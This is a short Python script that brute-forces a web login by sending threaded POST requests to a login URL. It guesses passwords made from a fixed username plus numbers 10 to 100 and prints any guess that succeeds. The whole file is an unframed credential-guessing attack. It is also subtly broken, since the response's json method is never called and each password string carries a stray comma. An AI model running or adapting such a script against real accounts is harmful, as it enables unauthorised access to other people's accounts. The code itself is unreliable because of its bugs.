import threading
import requests

username = "XAEA-XII"
url = "https://uww.space.ex/login"
def main(url,username,i):
    response = requests.post(url,data = {'action':'/login'},json = {'username':username,'password':f"{username}{i},",'login':"login"}).json
    if response['success'] == True or response['success'] == 'true':
        print("Password is "+ f"{username}{i}")

for i in range(10,101):
    instant = threading.Thread(target = main,args = (url,username,i))
    instant.start()

